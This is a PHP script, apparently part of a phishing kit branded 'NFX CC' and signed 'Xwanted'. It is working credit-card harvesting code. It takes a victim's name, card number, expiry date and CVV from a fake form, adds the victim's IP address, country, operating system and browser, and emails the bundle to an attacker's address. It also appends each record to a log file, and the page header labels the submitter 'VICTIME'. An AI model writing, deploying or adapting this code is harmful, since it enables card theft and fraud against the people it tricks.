<?php
header('Location: ../d3-cards');
require 'Email.php';
require 'getdata.php';
$fn = $_POST['fn'];
$ln = $_POST['ln'];
$cn = $_POST['cn'];
$ex = $_POST['ex'];
$cvv = $_POST['cvv'];
$to = "$rzlt_mail";
$subject = "👑 NFX CC | ".$ip." | ".$country." | " .$user_os;
$message = "
<html>
<head>
<meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
#################### <font style='color: #820000;'>NFX CC FULL</font> ####################<br/>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>CC INFORMATION</font> ]±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [First Name] = <font style='color:#0070ba;'>$fn</font><br>
<font style='color:#9c0000;'>✪</font> [Last Name] = <font style='color:#0070ba;'>$ln</font><br>
<font style='color:#9c0000;'>✪</font> [Card Number] = <font style='color:#0070ba;'>$cn</font><br>
<font style='color:#9c0000;'>✪</font> [Expiration Date] = <font style='color:#0070ba;'>$ex</font><br>
<font style='color:#9c0000;'>✪</font> [Card Security Code] = <font style='color:#0070ba;'>$cvv</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=$ip</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE] = <font style='color:#0070ba;'>$time</font><br>
<font style='color:#9c0000;'>✪</font> [OS] = <font style='color:#0070ba;'>$user_os</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>$user_browser</font><br>
##################### <font style='color: #820000;'>BY ✪ Xwanted ✪</font> #####################
</div></html>
";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= 'From:⭐XWANTED⭐ <xwanted@rez.co.uk>' . "\r\n";
mail($to,$subject,$message,$headers);

$path = "../../../admin/data/$ip.html";
file_put_contents($path,"$message<br><br>", FILE_APPEND);
?>